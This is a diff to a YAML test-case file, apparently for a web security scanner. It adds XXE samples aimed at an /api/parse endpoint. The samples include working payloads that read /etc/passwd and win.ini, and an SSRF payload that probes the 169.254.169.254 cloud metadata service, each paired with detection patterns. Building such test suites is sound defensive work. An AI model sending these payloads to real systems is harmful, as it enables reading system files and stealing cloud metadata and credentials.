@@ -163,3 +163,38 @@
       expected_signals: [evidence_pattern]
       evidence_patterns: ["smuggled"]
       tags: [smuggling, negative]
+
+- category: xxe
+  owasp: "A05 (Security Misconfiguration)"
+  surface: api
+  samples:
+    - id: xxe-001
+      name: XXE 读取本地文件
+      severity: critical
+      target_point: file_read
+      role_context: [student, customer]
+      method: POST
+      path: /api/parse
+      payload: "{payload}"
+      variables:
+        payload:
+          - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+          - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["root:x:", "\\[fonts\\]", "16-bit app"]
+      tags: [xxe, file-read]
+
+    - id: xxe-002
+      name: XXE SSRF 内网探测
+      severity: high
+      target_point: ssrf
+      role_context: [student, customer]
+      method: POST
+      path: /api/parse
+      payload: "{payload}"
+      variables:
+        payload:
+          - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+      expected_signals: [evidence_pattern]
+      evidence_patterns: ["ami-id", "instance-id", "root:x:"]
+      tags: [xxe, ssrf]
